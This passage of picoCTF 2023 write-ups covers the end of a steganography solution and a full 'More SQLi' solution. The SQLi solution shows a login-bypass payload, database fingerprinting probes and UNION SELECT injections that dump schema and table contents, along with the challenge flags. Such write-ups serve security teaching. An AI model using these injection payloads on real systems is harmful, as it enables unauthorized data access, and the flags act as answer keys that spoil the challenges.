39804         0x9B7C          Zip archive data, at least v2.0 to extract, compressed size: 2959, uncompressed size: 3108, name: secret/flag.png
42998         0xA7F6          End of Zip archive, footer length: 22
```

Once we loaded the secret/flag.png file we were able to see the flag in the image.  
picoCTF{Hiddinng_An_imag3_within_@n_ima9e_dc2ab58f}



### File: CTF-writeups/picoCTF2023/more_sqli.md

# More SQLi 

## Problem  
Can you find the flag on this website.
Try to find the flag here. [http://saturn.picoctf.net:53508/](http://saturn.picoctf.net:53508/)


## Solution

Putting in a random userid/password combo shows that it's doing a basic sql query where userid and password equal the supplied form fields.  To get around this we'll have to put in values in for userid and password that'll break the SQL and return a result.
```
password = 'or 1=1;--
userid = 123 or whatever you want.
```

Next up you are presented with a lookup form for finding city, address, and phone number.  Assuming that we have to figure out how to get all the data out of this table we need to figure out how to do a sql injection attack here as well.  
[https://book.hacktricks.xyz/pentesting-web/sql-injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)  
[https://www.hackingloops.com/sql-injection-cheat-sheet/](https://www.hackingloops.com/sql-injection-cheat-sheet/)  
[https://gist.github.com/Cuncis/eb6a0857b16e818a069da1e2c7e3f366](https://gist.github.com/Cuncis/eb6a0857b16e818a069da1e2c7e3f366)  
[https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)  

Started to google for various sql injection cheat sheets.  Walked through several queries trying to get some sort of responses so as to identify if this was an MySQL, PostgreSQL, SQLServer, SQLlite, etc, etc... 
```
1' + sleep(10); --
1' UNION select @@version;--
1' WAITFOR DELAY '0:0:10'; --
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

That last one didn't return a server error so it looks like it is a SQLlite database.  To confirm, I ran this query and it returned that it was version 3.31.1.
```
' UNION SELECT 1, sqlite_version(), 3;--
```

With that info in mind, I was able to find this query for getting SQLlite to provide the tables and their structure.  In the results the MORE_TABLE table referenced having a column called flag.
```
' UNION SELECT name, sql, null from sqlite_master;--  
```

Queried that table to spit out all the records and their flag column entries.  
```
' UNION SELECT flag, null, null from more_table;--
```

This only returned one record and the text was:  
```
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}	
```


